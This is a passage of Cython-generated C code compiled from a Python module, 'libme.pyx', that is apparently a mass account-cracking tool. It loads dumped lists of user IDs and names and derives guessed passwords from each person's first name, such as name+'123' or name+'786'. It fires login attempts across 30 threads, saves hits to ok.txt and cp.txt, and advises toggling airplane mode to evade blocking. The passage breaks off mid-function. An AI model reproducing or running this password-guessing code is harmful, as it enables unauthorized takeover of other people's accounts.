 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":976
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__Fr__rr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_9) < 0) __PYX_ERR(0, 976, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 976, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 976, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 976, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 976, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 976, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":975
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":954
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__Fr__rr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_myfile);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":990
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_63__me__nnn__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_63__me__nnn__ = {"__me__nnn__", (PyCFunction)__pyx_pw_5libme_5James_63__me__nnn__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_63__me__nnn__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__me__nnn__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_62__me__nnn__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_62__me__nnn__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_pastefile = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__me__nnn__", 0);

  /* "libme.pyx":991
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":992
 * 	def __me__nnn__(self):
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')             # <<<<<<<<<<<<<<
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 992, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_pastefile = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":993
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except IOError:
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 993, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_pastefile);
      __Pyx_GIVEREF(__pyx_v_pastefile);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_pastefile);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 993, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 993, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 993, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 993, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 993, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 993, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 993, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 993, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 993, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 993, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":994
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except IOError:
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 994, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 994, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 994, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 994, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":993
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except IOError:
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":991
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":995
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except IOError:             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 * 		print("  [] Total id > \033[0;91m%s\033[0;97m"%(len(self.id)))
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__me__nnn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 995, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":996
 * 				self.id.append(line.strip())
 * 		except IOError:
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))             # <<<<<<<<<<<<<<
 * 		print("  [] Total id > \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 */
      if (unlikely(!__pyx_v_pastefile)) { __Pyx_RaiseUnboundLocalError("pastefile"); __PYX_ERR(0, 996, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Please_Dump_File_first_s_not_fo, __pyx_v_pastefile); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 996, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 996, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":991
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __me__nnn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":997
 * 		except IOError:
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 * 		print("  [] Total id > \033[0;91m%s\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 */
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 997, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 997, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 997, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_97m_4, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 997, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 997, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":998
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 * 		print("  [] Total id > \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 998, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_ask = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":999
 * 		print("  [] Total id > \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 999, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":1000
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1000, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1000, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 1000, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1000, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1000, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1000, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1000, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":1001
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_example_separators_44) < 0) __PYX_ERR(0, 1001, __pyx_L18_error)

            /* "libme.pyx":1002
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 */
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1002, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_v_listpass = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":1003
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1003, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":1004
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1004, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":1003
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

